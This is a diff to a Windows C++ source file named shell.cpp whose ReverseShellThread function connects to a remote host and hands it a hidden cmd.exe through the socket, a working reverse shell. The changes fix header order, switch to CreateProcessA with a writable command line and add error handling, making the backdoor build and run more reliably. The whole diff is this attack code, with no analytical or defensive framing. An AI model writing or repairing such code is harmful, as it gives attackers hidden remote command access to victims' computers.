@@ -1,10 +1,12 @@
 // src/shell.cpp
-#include <windows.h>
+// Must include winsock2.h before windows.h
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+
 #pragma comment(lib, "ws2_32.lib")
 
 DWORD WINAPI ReverseShellThread(LPVOID lpParam) {
@@ -15,17 +17,20 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam) {
         HeapFree(GetProcessHeap(), 0, (LPVOID)target);
         return 1;
     }
+
     WSADATA wsa;
-    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
         HeapFree(GetProcessHeap(), 0, (LPVOID)target);
         return 1;
     }
+
     SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (sock == INVALID_SOCKET) {
         WSACleanup();
         HeapFree(GetProcessHeap(), 0, (LPVOID)target);
         return 1;
     }
+
     struct sockaddr_in addr;
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
@@ -35,18 +40,29 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam) {
         HeapFree(GetProcessHeap(), 0, (LPVOID)target);
         return 1;
     }
+
     if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
         closesocket(sock);
         WSACleanup();
         HeapFree(GetProcessHeap(), 0, (LPVOID)target);
         return 1;
     }
-    STARTUPINFO si = {0};
+
+    // Use CreateProcessA with a writable command line
+    char cmdLine[] = "cmd.exe";
+    STARTUPINFOA si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESTDHANDLES;
     si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
-    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+
+    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        closesocket(sock);
+        WSACleanup();
+        HeapFree(GetProcessHeap(), 0, (LPVOID)target);
+        return 1;
+    }
+
     WaitForSingleObject(pi.hProcess, INFINITE);
     closesocket(sock);
     WSACleanup();
